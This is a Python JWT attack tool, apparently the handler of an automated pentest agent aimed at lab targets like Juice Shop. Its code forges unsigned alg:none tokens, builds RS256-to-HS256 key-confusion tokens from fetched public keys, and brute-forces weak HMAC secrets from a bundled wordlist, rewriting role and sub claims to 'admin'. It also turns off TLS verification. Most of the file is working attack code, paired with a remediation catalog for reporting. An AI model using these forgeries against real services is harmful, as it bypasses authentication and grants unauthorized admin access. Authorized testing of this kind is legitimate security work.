#!/usr/bin/env python3
"""
jwt_tool_handler.py — Automated JWT security testing (A07).

Runs standalone or as a Docker image. Pure stdlib. Outputs structured JSON
that the agent interprets. Validates every attack with 3 baselines to
avoid false positives (a 200 is NOT evidence of bypass).

Usage:
    python jwt_tool_handler.py --target URL --token JWT [--test-endpoint PATH] [--output FILE]
"""

import argparse
import base64
import hashlib
import hmac
import json
import math
import os
import ssl
import sys
import time
import urllib.error
import urllib.request
from datetime import datetime, timezone

# ---- Configuration --------------------------------------------------------

TEST_PATHS = [
    # Dulce Nube — endpoint con requireStrictAuth (nunca cae al bypass de
    # MISSING_AUTH_ME de BAC). Debe ir primero para no confundir el discovery
    # con /api/me, que en Dulce Nube devuelve 200 sin token si MISSING_AUTH_ME
    # está ON (grupo BAC).
    "/api/auth/whoami",
    # Juice Shop / WackoPicko / genéricos
    "/api/Users/",
    "/api/users",
    "/api/user/me",
    "/api/me",
    "/whoami",
    "/me",
    "/profile",
    "/api/profile",
    "/rest/user/whoami",
    "/api/v1/users",
    "/users",
    "/api/accounts",
]

PUBKEY_PATHS = [
    "/encryptionkeys/jwt.pub",
    "/.well-known/jwks.json",
    "/jwks.json",
    "/pubkey.pem",
    "/api/auth/public-key",
]

ROLE_NAMES = {
    "role",
    "roles",
    "is_admin",
    "isadmin",
    "admin",
    "scope",
    "scopes",
    "permissions",
    "groups",
    "user_type",
    "usertype",
    "account_type",
}

SENSITIVE_NAMES = {
    "password",
    "passwd",
    "pwd",
    "secret",
    "apikey",
    "api_key",
    "private_key",
    "ssn",
    "credit_card",
    "card_number",
}

DEFAULT_WORDLIST = [
    "",
    "k",
    "jwt",
    "key",
    "token",
    "secret",
    "secret1",
    "password",
    "admin",
    "test",
    "123",
    "1234",
    "12345",
    "123456",
    "1234567",
    "12345678",
    "123456789",
    "password1",
    "password123",
    "admin123",
    "qwerty",
    "letmein",
    "changeme",
    "welcome",
    "iloveyou",
    "monkey",
    "dragon",
    "master",
    "jwt_secret",
    "jwtsecret",
    "jwt-key",
    "jwtkey",
    "supersecret",
    "s3cr3t",
    "s3cr3t!",
    "mysecret",
    "my-secret",
    "topsecret",
    "secure",
    "securekey",
    "devkey",
    "development",
    "production",
    "juiceshop",
    "juice-shop",
    "juice",
    "owasp",
    "bkimminich",
]

# ---- Wordlist externo y transporte HTTP (configurable) --------------------

# Directorio del propio handler (para resolver rutas relativas al módulo).
_HANDLER_DIR = os.path.dirname(os.path.abspath(__file__))

# Cascada de búsqueda del wordlist externo. Se prueba en orden:
#   1) code/skills_controller/handlers/wordlists/jwt.secrets.list  (recomendado)
#   2) jwt.secrets.list en la raíz del proyecto SECURE/
#   3) jwt.secrets.list en el directorio actual de trabajo

# Wordlist externo: wordlists/jwt.secrets.list
# Fuente: https://github.com/wallarm/jwt-secrets  (Licencia MIT, ver wordlists/README.md)
WORDLIST_CANDIDATES = [
    os.path.join(_HANDLER_DIR, "wordlists", "jwt.secrets.list"),
    os.path.join(_HANDLER_DIR, "..", "..", "..", "jwt.secrets.list"),
    os.path.join(os.getcwd(), "jwt.secrets.list"),
]

# Transporte del JWT. Se sobreescribe vía --token-transport (o run_jwt_attack).
#   "both"   → header Authorization + cookie session  (default, máxima compat)
#   "header" → solo header Authorization
#   "cookie" → solo cookie session
_HTTP_TRANSPORT = "both"
_HTTP_COOKIE_NAME = "session"


# ---- JWT utilities (stdlib only) ------------------------------------------


def b64d(data):
    if isinstance(data, str):
        data = data.encode()
    pad = 4 - len(data) % 4
    if pad != 4:
        data += b"=" * pad
    return base64.urlsafe_b64decode(data)


def b64e(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=")


def decode_jwt(token):
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError(f"Invalid JWT: expected 3 parts, got {len(parts)}")
    return {
        "header": json.loads(b64d(parts[0])),
        "payload": json.loads(b64d(parts[1])),
        "signature": parts[2],
    }


def find_role_path(payload, path=""):
    if isinstance(payload, dict):
        for k, v in payload.items():
            cur = f"{path}.{k}" if path else k
            if k.lower() in ROLE_NAMES and isinstance(v, str):
                return cur, v
            res = find_role_path(v, cur)
            if res and res[0] is not None:
                return res
    return None, None


def find_sensitive(payload, path=""):
    found = []
    if isinstance(payload, dict):
        for k, v in payload.items():
            cur = f"{path}.{k}" if path else k
            if k.lower() in SENSITIVE_NAMES and isinstance(v, str):
                preview = v[:12] + "..." if len(v) > 12 else v
                found.append({"path": cur, "value_preview": preview, "length": len(v)})
            found.extend(find_sensitive(v, cur))
    return found


def set_nested(d, path, value):
    node = d
    parts = path.split(".")
    for p in parts[:-1]:
        node = node[p]
    node[parts[-1]] = value


# ---- HTTP (stdlib only, no external deps) ---------------------------------


def http(url, method="GET", headers=None, body=None, timeout=10):
    headers = dict(headers or {})
    auth = headers.get("Authorization", "")
    if auth.startswith("Bearer "):
        token = auth[len("Bearer "):]
        # "both" y "cookie" → enviar también en cookie
        if _HTTP_TRANSPORT in ("both", "cookie"):
            headers.setdefault("Cookie", f"{_HTTP_COOKIE_NAME}={token}")
        # "cookie" → quitar header (el server podría rechazarlo)
        if _HTTP_TRANSPORT == "cookie":
            headers.pop("Authorization", None)
    # "header" → quitar cookie si venía
    elif _HTTP_TRANSPORT == "header":
        headers.pop("Cookie", None)

    req = urllib.request.Request(url, method=method)
    for k, v in headers.items():
        req.add_header(k, v)
    if body is not None:
        req.data = body.encode() if isinstance(body, str) else body
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            data = r.read()
            return {
                "status": r.status,
                "size": len(data),
                "body": data.decode("utf-8", errors="replace"),
            }
    except urllib.error.HTTPError as e:
        data = e.read()
        return {"status": e.code, "size": len(data), "body": data.decode("utf-8", errors="replace")}
    except Exception as e:
        return {"status": 0, "size": 0, "body": "", "error": str(e)}


# ---- Attack forgers -------------------------------------------------------


def forge_alg_none(payload):
    h = b64e(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode())
    p = b64e(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h.decode()}.{p.decode()}."


def verify_hs256(token, secret):
    """Verifica si `secret` es la clave HMAC-SHA256 que firmó `token`.

    Uso principal: PRE-FILTRO LOCAL en el brute force. Si un candidato no
    reproduce la firma del token original, no puede ser el secreto correcto
    y evitamos hacer una petición HTTP innecesaria al servidor.
    """
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return False
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        expected = (
            base64.urlsafe_b64encode(
                hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
            )
            .rstrip(b"=")
            .decode()
        )
        return hmac.compare_digest(expected, parts[2])
    except Exception:
        return False


def _read_wordlist_file(path):
    """Lee un archivo de wordlist: una palabra por línea, sin vacías, sin duplicados."""
    seen = set()
    result = []
    try:
        with open(path, encoding="utf-8", errors="ignore") as f:
            for line in f:
                word = line.strip()
                if word and word not in seen:
                    seen.add(word)
                    result.append(word)
    except OSError as exc:
        print(f"[jwt_tool_handler] No se pudo leer wordlist '{path}': {exc}", file=sys.stderr)
    return result


def load_wordlist(path=None):
    """Carga el wordlist con cascada de fallbacks.

    Prioridad:
      1. Argumento explícito `path` (CLI --wordlist)
      2. WORDLIST_CANDIDATES (primero el primero que exista y no esté vacío)
      3. DEFAULT_WORDLIST hardcodeado

    Retorna (words, source). `source` es una etiqueta para el JSON:
    "cli", "file:<ruta>" o "builtin".
    """
    if path:
        words = _read_wordlist_file(path)
        if words:
            return words, "cli"
        print(
            f"[jwt_tool_handler] Wordlist '{path}' vacío o ilegible, usando fallback",
            file=sys.stderr,
        )

    for candidate in WORDLIST_CANDIDATES:
        if os.path.isfile(candidate):
            words = _read_wordlist_file(candidate)
            if words:
                print(
                    f"[jwt_tool_handler] Wordlist cargado: {candidate} " f"({len(words)} entradas)",
                    file=sys.stderr,
                )
                return words, f"file:{candidate}"

    print(
        f"[jwt_tool_handler] Wordlist externo no encontrado; usando DEFAULT_WORDLIST "
        f"({len(DEFAULT_WORDLIST)} entradas)",
        file=sys.stderr,
    )
    return list(DEFAULT_WORDLIST), "builtin"


def forge_hs256(payload, secret_bytes):
    h = b64e(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    p = b64e(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = h + b"." + p
    sig = hmac.new(secret_bytes, signing_input, hashlib.sha256).digest()
    return (signing_input + b"." + b64e(sig)).decode()


# ---- 3-baseline validation ------------------------------------------------


def validate_attack(
    target, forged_token, customer_token, auth_header="Authorization", auth_prefix="Bearer "
):
    r_none = http(target)
    r_cust = http(target, headers={auth_header: f"{auth_prefix}{customer_token}"})
    r_forg = http(target, headers={auth_header: f"{auth_prefix}{forged_token}"})

    success, reason = False, "unknown"
    if r_forg["status"] == 0:
        reason = "request_failed"
    elif r_forg["status"] == 401:
        reason = "signature_rejected"
    elif r_forg["status"] == 403:
        reason = "forbidden"
    elif r_forg["status"] == 200:
        if r_none["status"] == 200:
            reason = "endpoint_public_no_auth_required"
        else:
            success = True
            reason = (
                "auth_bypass_confirmed"
                if r_cust["status"] != 200
                else "auth_bypass_both_tokens_accepted"
            )

    return {
        "success": success,
        "reason": reason,
        "baselines": {
            "no_auth": {"status": r_none["status"], "size": r_none["size"]},
            "customer": {"status": r_cust["status"], "size": r_cust["size"]},
            "forged": {"status": r_forg["status"], "size": r_forg["size"]},
        },
        "body_preview": r_forg["body"][:800] if r_forg["body"] else "",
    }


# ---- Discovery ------------------------------------------------------------


def discover_test_endpoint(base, customer_token):
    for path in TEST_PATHS:
        url = base.rstrip("/") + path
        r_none = http(url)
        if r_none["status"] != 401:
            continue
        r_auth = http(url, headers={"Authorization": f"Bearer {customer_token}"})
        if r_auth["status"] == 200:
            return {"url": url, "path": path, "no_auth_status": 401, "auth_status": 200}
    return None


def discover_pubkey(base):
    for path in PUBKEY_PATHS:
        url = base.rstrip("/") + path
        r = http(url)
        if r["status"] == 200 and len(r["body"]) > 50 and "-----" in r["body"]:
            return {"url": url, "pem": r["body"]}
        if r["status"] == 200 and r["body"].strip().startswith("{"):
            return {"url": url, "jwks": r["body"]}
    return None


# ---- Attacks --------------------------------------------------------------


def attack_alg_none(endpoint, decoded, customer_token):
    payload = decoded["payload"].copy()
    role_path, role_val = find_role_path(payload)
    if role_path:
        set_nested(payload, role_path, "admin")
    forged = forge_alg_none(payload)
    validation = validate_attack(endpoint, forged, customer_token)
    return {
        "attempted": True,
        "success": validation["success"],
        "reason": validation["reason"],
        "forged_token": forged,
        "role_modified": (
            {"path": role_path, "from": role_val, "to": "admin"} if role_path else None
        ),
        "validation": validation,
    }


def attack_key_confusion(endpoint, decoded, customer_token, base):
    pub = discover_pubkey(base)
    if not pub:
        return {"attempted": False, "reason": "public_key_not_found"}
    if "jwks" in pub:
        return {
            "attempted": False,
            "reason": "jwks_found_but_not_implemented",
            "jwks_url": pub["url"],
        }
    payload = decoded["payload"].copy()
    role_path, role_val = find_role_path(payload)
    if role_path:
        set_nested(payload, role_path, "admin")
    forged = forge_hs256(payload, pub["pem"].encode())
    validation = validate_attack(endpoint, forged, customer_token)
    return {
        "attempted": True,
        "success": validation["success"],
        "reason": validation["reason"],
        "pubkey_url": pub["url"],
        "forged_token": forged,
        "role_modified": (
            {"path": role_path, "from": role_val, "to": "admin"} if role_path else None
        ),
        "validation": validation,
    }


def attack_weak_secret(
    endpoint,
    decoded,
    customer_token,
    wordlist=None,
    max_attempts=0,
    use_prefilter=True,
    wordlist_source="builtin",
):
    wordlist = wordlist or DEFAULT_WORDLIST
    base = decoded["payload"].copy()

    # Variante 1: sub -> administrator (el caso de PortSwigger y similares)
    v_sub_admin = base.copy()
    if "sub" in v_sub_admin:
        v_sub_admin["sub"] = "administrator"

    # Variante 2: role/scope -> admin (apps con claim de rol)
    v_role = base.copy()
    role_path, _ = find_role_path(v_role)
    if role_path:
        set_nested(v_role, role_path, "admin")

    # Variante 3: sub -> admin (fallback genérico)
    v_sub_generic = base.copy()
    if "sub" in v_sub_generic:
        v_sub_generic["sub"] = "admin"

    variants = [v_sub_admin, v_role, v_sub_generic]

    prefiltered = 0
    tested = 0
    started = time.monotonic()

    for guess in wordlist:
        if max_attempts and tested >= max_attempts:
            break

        # ── Pre-filtro LOCAL: ¿el guess firma realmente el token original? ──
        # Un candidato que no reproduce la firma NO puede ser el secreto.
        # Ahorra N×3 requests → solo unos pocos al servidor.
        if use_prefilter and not verify_hs256(customer_token, guess):
            prefiltered += 1
            continue

        tested += 1
        for payload in variants:
            forged = forge_hs256(payload, guess.encode())
            r = http(endpoint, headers={"Authorization": f"Bearer {forged}"})
            if r["status"] == 200:
                validation = validate_attack(endpoint, forged, customer_token)
                duration = round(time.monotonic() - started, 3)
                return {
                    "attempted": True,
                    "success": True,
                    "reason": "weak_secret_cracked",
                    "cracked_secret": guess,
                    "attempts": tested,
                    "prefiltered": prefiltered,
                    "duration_seconds": duration,
                    "attempts_per_second": round(tested / duration, 2) if duration > 0 else None,
                    "wordlist_source": wordlist_source,
                    "forged_payload": payload,
                    "validation": validation,
                }

    duration = round(time.monotonic() - started, 3)
    result = {
        "attempted": True,
        "success": False,
        "reason": "no_weak_secret_found",
        "attempts": tested,
        "prefiltered": prefiltered,
        "duration_seconds": duration,
        "wordlist_size": len(wordlist),
        "wordlist_source": wordlist_source,
    }
    if use_prefilter and tested == 0 and prefiltered > 0:
        result["warning"] = (
            "prefilter_rejected_all_candidates: el token provisto no fue firmado por "
            "ninguna entrada del wordlist. Reintenta con --no-prefilter si sospechas "
            "que el token fue alterado en tránsito."
        )
    return result


# ---- Analysis + findings --------------------------------------------------


def analyze_jwt(decoded, token):
    h, p = decoded["header"], decoded["payload"]
    alg = h.get("alg", "unknown")
    exp = p.get("exp")
    if isinstance(exp, (int, float)) and not isinstance(exp, bool) and math.isfinite(exp):
        expires_in_seconds = exp - time.time()
        is_expired = expires_in_seconds <= 0
    else:
        expires_in_seconds = None
        is_expired = None
    role_path, role_val = find_role_path(p)
    sensitive = find_sensitive(p)

    weaknesses = []
    if alg.lower() == "none":
        weaknesses.append({"id": "alg_none_accepted", "severity": "CRITICAL"})
    if "exp" not in p:
        weaknesses.append(
            {"id": "no_expiration", "severity": "HIGH", "description": "Token never expires"}
        )
    if "iss" not in p and "aud" not in p:
        weaknesses.append({"id": "no_iss_aud", "severity": "MEDIUM"})
    if sensitive:
        weaknesses.append(
            {"id": "sensitive_data_in_payload", "severity": "HIGH", "items": sensitive}
        )
    if role_path and role_val:
        weaknesses.append(
            {"id": "role_in_payload", "severity": "MEDIUM", "path": role_path, "value": role_val}
        )
    if alg.startswith("HS"):
        weaknesses.append(
            {
                "id": "symmetric_algorithm",
                "severity": "MEDIUM",
                "description": "Weak secret brute-forcible",
            }
        )
    if alg.startswith(("RS", "PS", "ES")):
        weaknesses.append(
            {
                "id": "asymmetric_algorithm",
                "severity": "LOW",
                "description": "Try key confusion attack",
            }
        )

    return {
        "algorithm": alg,
        "algorithm_family": "asymmetric" if alg.startswith(("RS", "PS", "ES")) else "symmetric",
        "claims_present": list(p.keys()),
        "claims_missing": [c for c in ["exp", "nbf", "iss", "aud", "sub", "jti"] if c not in p],
        "expires_in_seconds": expires_in_seconds,
        "is_expired": is_expired,
        "role_claim": {"path": role_path, "value": role_val} if role_path else None,
        "sensitive_claims": sensitive,
        "weaknesses": weaknesses,
        "signature_bytes": len(decoded["signature"]),
    }


# ---- Catálogo enriquecido de hallazgos -----------------------------------

WEAKNESS_CATALOG = {
    "alg_none_accepted": {
        "title": "JWT uses 'alg: none' (unsigned token)",
        "description": (
            "The JWT header specifies alg=none, meaning the token carries no signature. "
            "A naive verifier that trusts the 'alg' field will accept any payload as authentic."
        ),
        "remediation": (
            "Enforce a server-side algorithm whitelist (e.g. only RS256). "
            "Explicitly reject any token whose header contains alg=none."
        ),
        "cwe": "CWE-347",
    },
    "no_expiration": {
        "title": "JWT has no 'exp' claim (no expiration)",
        "description": (
            "The token does not include an expiration time (exp). Once issued it remains "
            "valid indefinitely, widening the exploitation window if it leaks or is stolen."
        ),
        "remediation": (
            "Include an 'exp' claim with a short TTL (15–60 minutes for access tokens). "
            "Pair it with a refresh-token flow to avoid re-login."
        ),
        "cwe": "CWE-613",
    },
    "no_iss_aud": {
        "title": "JWT is missing 'iss' / 'aud' claims",
        "description": (
            "The token lacks issuer (iss) and audience (aud) claims. A token minted by "
            "one service can therefore be replayed against another service that shares "
            "the signing key or trusts the same authorization server."
        ),
        "remediation": (
            "Include and validate 'iss' and 'aud' claims on every token verification. "
            "Reject tokens whose issuer or audience do not match the expected values."
        ),
        "cwe": "CWE-345",
    },
    "sensitive_data_in_payload": {
        "title": "Sensitive data exposed in JWT payload",
        "description": (
            "The JWT payload carries fields that should never leave the server: "
            "password hashes, tokens, API keys or PII. JWT payloads are base64-encoded "
            "and therefore readable by anyone holding the token."
        ),
        "remediation": (
            "Remove secrets and PII from the token payload. Store only opaque identifiers "
            "and resolve sensitive data server-side per request."
        ),
        "cwe": "CWE-522",
    },
    "role_in_payload": {
        "title": "Authorization role embedded in JWT payload",
        "description": (
            "The user role or permission level is stored in the token. If signature "
            "verification is ever bypassed, the attacker can escalate privileges by "
            "modifying this field (e.g. role='admin')."
        ),
        "remediation": (
            "Resolve roles server-side from a trusted store per request. If the role must "
            "live in the token, ensure signature verification cannot be bypassed."
        ),
        "cwe": "CWE-639",
    },
    "symmetric_algorithm": {
        "title": "JWT uses symmetric algorithm (HS*)",
        "description": (
            "Symmetric algorithms require the same secret for signing and verification. "
            "A weak or leaked secret lets an attacker forge arbitrary tokens."
        ),
        "remediation": (
            "Prefer asymmetric algorithms (RS256/ES256). If HS* is required, use a "
            "high-entropy secret (>=256 bits) generated by a CSPRNG and rotate it periodically."
        ),
        "cwe": "CWE-326",
    },
    "asymmetric_algorithm": {
        "title": "JWT uses asymmetric algorithm (RS/PS/ES)",
        "description": (
            "Asymmetric algorithms are secure when the private key is protected, but if the "
            "server's public key is discoverable and the algorithm is not pinned per token, "
            "key-confusion attacks may be possible."
        ),
        "remediation": (
            "Pin the expected algorithm per token and never trust the 'alg' header from "
            "the token itself. Serve the public key only when required and monitor "
            "for anomalous verification failures."
        ),
        "cwe": "CWE-347",
    },
}


def _format_baselines(baselines):
    if not baselines:
        return ""
    return (
        f"no_auth={baselines.get('no_auth', {}).get('status')} "
        f"customer_token={baselines.get('customer', {}).get('status')} "
        f"forged_token={baselines.get('forged', {}).get('status')} "
        f"(forged_response_size={baselines.get('forged', {}).get('size')} bytes)"
    )


def _any_forging_success(attacks):
    """True si algún ataque de forja (alg:none / key confusion / weak secret) tuvo éxito."""
    return bool(
        attacks.get("alg_none", {}).get("success")
        or attacks.get("key_confusion", {}).get("success")
        or attacks.get("weak_secret", {}).get("success")
    )


def consolidate_findings(analysis, attacks, discovery):
    findings = []

    # ---------- 1. Findings derived from static analysis ----------
    for w in analysis["weaknesses"]:
        wid = w["id"]

        # ── Filtro de falsos positivos ────────────────────────────────
        # "symmetric_algorithm" y "role_in_payload" solo se promueven a
        # hallazgo confirmado cuando un ataque de forja tuvo éxito.
        # Esto alinea el reporte con los flags de Dulce Nube:
        #   - JWT_WEAK_SECRET=false  ⇒ weak_secret.success=False ⇒ no se reporta
        #   - JWT_ALG_NONE=false     ⇒ forging_success=False      ⇒ no se reporta
        # Sin este filtro, un HS256 con secreto fuerte (config segura) se
        # seguía reportando como MEDIUM, lo que el usuario percibía como
        # "el flag sigue activo".
        if wid == "symmetric_algorithm" and not attacks.get("weak_secret", {}).get("success"):
            continue
        if wid == "role_in_payload" and not _any_forging_success(attacks):
            continue
        if wid == "no_iss_aud" and not _any_forging_success(attacks):
            continue

        meta = WEAKNESS_CATALOG.get(wid, {})

        evidence_parts = []
        if wid == "sensitive_data_in_payload":
            items = w.get("items", []) or []
            if items:
                rendered = ", ".join(
                    f"{i['path']} ({i['length']} bytes, preview='{i['value_preview']}')"
                    for i in items[:5]
                )
                evidence_parts.append(f"Exposed fields: {rendered}")
        elif wid == "role_in_payload":
            evidence_parts.append(f"Role claim '{w.get('path')}' = {w.get('value')!r} in payload")
        elif wid == "no_expiration":
            evidence_parts.append(
                f"Claims present: {', '.join(analysis.get('claims_present', [])) or '(none)'} | "
                f"Missing standard claims: {', '.join(analysis.get('claims_missing', []))}"
            )
        elif wid == "no_iss_aud":
            missing = [c for c in ("iss", "aud", "nbf") if c in analysis.get("claims_missing", [])]
            evidence_parts.append(f"Missing claims: {', '.join(missing) or 'iss, aud'}")
        elif wid in ("symmetric_algorithm", "asymmetric_algorithm"):
            evidence_parts.append(
                f"Algorithm: {analysis.get('algorithm')} | "
                f"family: {analysis.get('algorithm_family')}"
            )

        findings.append(
            {
                "id": f"A07-{len(findings)+1:02d}",
                "severity": w["severity"],
                "title": meta.get("title") or wid.replace("_", " ").title(),
                "description": meta.get("description") or w.get("description", ""),
                "evidence": " | ".join(evidence_parts),
                "remediation": meta.get("remediation", ""),
                "cwe": meta.get("cwe", ""),
                "owasp": "A07:2025",
                "source": "jwt_analysis",
            }
        )

    # ---------- 2. Findings derived from active attacks ----------
    if attacks.get("alg_none", {}).get("success"):
        baselines = attacks["alg_none"]["validation"]["baselines"]
        role_mod = attacks["alg_none"].get("role_modified")
        findings.append(
            {
                "id": f"A07-{len(findings)+1:02d}",
                "severity": "CRITICAL",
                "title": "JWT alg:none bypass — authentication completely bypassed",
                "description": (
                    f"The server accepted an unsigned JWT (alg=none) against the protected "
                    f"endpoint {discovery['url']} and returned the resource. "
                    f"Anyone can forge an authenticated session by setting alg=none."
                ),
                "evidence": (
                    f"Endpoint: {discovery['url']} | "
                    f"{_format_baselines(baselines)} | "
                    f"role_modified={role_mod if role_mod else 'none'}"
                ),
                "remediation": (
                    "Enforce an algorithm whitelist. Explicitly reject alg=none at token "
                    "verification. Never trust the 'alg' header from the incoming token."
                ),
                "cwe": "CWE-347",
                "owasp": "A07:2025",
                "source": "attack:alg_none",
            }
        )

    if attacks.get("key_confusion", {}).get("success"):
        baselines = attacks["key_confusion"]["validation"]["baselines"]
        pub = attacks["key_confusion"].get("pubkey_url")
        findings.append(
            {
                "id": f"A07-{len(findings)+1:02d}",
                "severity": "CRITICAL",
                "title": "JWT key confusion (RS256 → HS256) — signature bypass",
                "description": (
                    f"The server accepted an HS256 token signed with its own RSA public key "
                    f"(fetched from {pub}). An attacker with the public key can forge "
                    f"arbitrary signed tokens."
                ),
                "evidence": (
                    f"Public key source: {pub} | "
                    f"Endpoint: {discovery['url']} | "
                    f"{_format_baselines(baselines)}"
                ),
                "remediation": (
                    "Pin the expected algorithm per token. Never derive the HMAC secret "
                    "from an asymmetric public key. Use distinct verification paths for "
                    "RS* and HS* algorithms."
                ),
                "cwe": "CWE-347",
                "owasp": "A07:2025",
                "source": "attack:key_confusion",
            }
        )

    if attacks.get("weak_secret", {}).get("success"):
        cracked = attacks["weak_secret"]["cracked_secret"]
        attempts = attacks["weak_secret"].get("attempts") or "N/D"
        findings.append(
            {
                "id": f"A07-{len(findings)+1:02d}",
                "severity": "CRITICAL",
                "title": "Weak HMAC signing secret recovered via wordlist",
                "description": (
                    f"The HS* signing secret was recovered from a common wordlist after "
                    f"{attempts} attempts. With the secret, an attacker can forge tokens "
                    f"with arbitrary claims (role, user id, expiration)."
                ),
                "evidence": (
                    f"Cracked secret: {cracked!r} | "
                    f"Wordlist size tried: {attempts} | "
                    f"Endpoint: {discovery['url']}"
                ),
                "remediation": (
                    "Rotate the signing secret immediately and invalidate existing tokens. "
                    "Generate the new secret with a CSPRNG (>=256 bits)."
                ),
                "cwe": "CWE-521",
                "owasp": "A07:2025",
                "source": "attack:weak_secret",
            }
        )

    return findings


def _empty_summary():
    return {
        "total_findings": 0,
        "critical": 0,
        "high": 0,
        "medium": 0,
        "low": 0,
        "risk_level": "NONE",
        "attacks_succeeded": 0,
    }


def _with_execution(result, started_at, started_monotonic):
    finished_at = datetime.now(timezone.utc)
    result["execution"] = {
        "started_at": started_at.isoformat(),
        "finished_at": finished_at.isoformat(),
        "duration_seconds": round(max(0.0, time.monotonic() - started_monotonic), 6),
    }
    return result


# ---- Main orchestrator ----------------------------------------------------


def run_jwt_attack(
    target,
    token,
    test_endpoint=None,
    wordlist=None,
    max_attempts=0,
    use_prefilter=True,
    transport="both",
):
    global _HTTP_TRANSPORT
    _HTTP_TRANSPORT = transport

    started_at = datetime.now(timezone.utc)
    started_monotonic = time.monotonic()
    decoded = decode_jwt(token)
    exp = decoded["payload"].get("exp")
    now = time.time()
    warnings = []

    if isinstance(exp, (int, float)) and not isinstance(exp, bool) and math.isfinite(exp):
        if exp <= now:
            analysis = analyze_jwt(decoded, token)
            return _with_execution({
                "tool": "jwt_tool_handler",
                "version": "1.0.0",
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "target": target,
                "discovery": None,
                "jwt_analysis": analysis,
                "attacks": {},
                "findings": [],
                "summary": _empty_summary(),
                "error": "token_expired",
                "exp": exp,
                "hint": "Obtén un token fresco",
            }, started_at, started_monotonic)
        if exp - now < 300:
            warnings.append("token_expires_soon")

    analysis = analyze_jwt(decoded, token)

    if test_endpoint:
        discovery = {"url": target.rstrip("/") + test_endpoint, "source": "provided"}
    else:
        disc = discover_test_endpoint(target, token)
        if not disc:
            findings = consolidate_findings(analysis, {}, {})
            severities = [f["severity"] for f in findings]
            risk = (
                "CRITICAL"
                if "CRITICAL" in severities
                else ("HIGH" if "HIGH" in severities
                      else "MEDIUM" if "MEDIUM" in severities
                      else "LOW" if severities else "NONE")
            )
            result = {
                "tool": "jwt_tool_handler",
                "version": "1.0.0",
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "target": target,
                "discovery": None,
                "error": "no_test_endpoint_found",
                "hint": "Provide --test-endpoint or ensure target has a 401-protected path",
                "jwt_analysis": analysis,
                "attacks": {},
                "findings": findings,
                "summary": {
                    "total_findings": len(findings),
                    "critical": severities.count("CRITICAL"),
                    "high": severities.count("HIGH"),
                    "medium": severities.count("MEDIUM"),
                    "low": severities.count("LOW"),
                    "risk_level": risk,
                    "attacks_succeeded": 0,
                },
            }
            if warnings:
                result["warnings"] = warnings
            return _with_execution(result, started_at, started_monotonic)
        discovery = {"url": disc["url"], "path": disc["path"], "source": "auto_discovered"}

    attacks = {}
    attacks["alg_none"] = attack_alg_none(discovery["url"], decoded, token)

    alg = decoded["header"].get("alg", "")
    if alg.startswith(("RS", "PS", "ES")):
        attacks["key_confusion"] = attack_key_confusion(discovery["url"], decoded, token, target)
    elif alg.startswith("HS"):
        wl, wl_source = load_wordlist(wordlist)
        attacks["weak_secret"] = attack_weak_secret(
            discovery["url"],
            decoded,
            token,
            wordlist=wl,
            max_attempts=max_attempts,
            use_prefilter=use_prefilter,
            wordlist_source=wl_source,
        )

    findings = consolidate_findings(analysis, attacks, discovery)

    severities = [f["severity"] for f in findings]
    risk = (
        "CRITICAL"
        if "CRITICAL" in severities
        else ("HIGH" if "HIGH" in severities
              else "MEDIUM" if "MEDIUM" in severities
              else "LOW" if severities else "NONE")
    )

    result = {
        "tool": "jwt_tool_handler",
        "version": "1.0.0",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "target": target,
        "discovery": discovery,
        "jwt_analysis": analysis,
        "attacks": attacks,
        "findings": findings,
        "summary": {
            "total_findings": len(findings),
            "critical": severities.count("CRITICAL"),
            "high": severities.count("HIGH"),
            "medium": severities.count("MEDIUM"),
            "low": severities.count("LOW"),
            "risk_level": risk,
            "attacks_succeeded": sum(1 for a in attacks.values() if a.get("success")),
        },
    }
    if warnings:
        result["warnings"] = warnings
    return _with_execution(result, started_at, started_monotonic)


# ---- CLI ------------------------------------------------------------------


def main():
    ap = argparse.ArgumentParser(description="Automated JWT security testing")
    ap.add_argument("--target", required=True, help="Base URL (e.g. http://juice-shop-target:3000)")
    ap.add_argument("--token", required=True, help="Original JWT to analyze/attack")
    ap.add_argument("--test-endpoint", help="Override auto-discovery (e.g. /api/Users/)")
    ap.add_argument("--output", help="Write JSON to file")
    ap.add_argument(
        "--wordlist",
        help="Path to wordlist file (one secret per line). "
             "Si se omite, se busca en wordlists/jwt.secrets.list y en la raíz del proyecto.",
    )
    ap.add_argument(
        "--max-attempts", type=int, default=0,
        help="Stop brute force after N server attempts (0 = unlimited)",
    )
    ap.add_argument(
        "--no-prefilter", action="store_true",
        help="Disable local HMAC pre-filter (sends ALL candidates to the server)",
    )
    ap.add_argument(
        "--token-transport", choices=["both", "header", "cookie"], default="both",
        help="How to send the JWT: both (default), header only, or cookie only",
    )
    args = ap.parse_args()

    started_at = datetime.now(timezone.utc)
    started_monotonic = time.monotonic()
    try:
        result = run_jwt_attack(
            args.target,
            args.token,
            args.test_endpoint,
            wordlist=args.wordlist,
            max_attempts=args.max_attempts,
            use_prefilter=not args.no_prefilter,
            transport=args.token_transport,
        )
    except Exception as e:
        result = {
            "tool": "jwt_tool_handler",
            "version": "1.0.0",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "target": args.target,
            "discovery": None,
            "jwt_analysis": None,
            "attacks": {},
            "findings": [],
            "summary": _empty_summary(),
            "error": type(e).__name__,
            "message": str(e),
            "hint": "Verify that --token is a valid JWT (header.payload.signature).",
        }
        result = _with_execution(result, started_at, started_monotonic)

    json_str = json.dumps(result, indent=2)
    print(json_str)
    if args.output:
        with open(args.output, "w", encoding="utf-8") as f:
            f.write(json_str)


if __name__ == "__main__":
    main()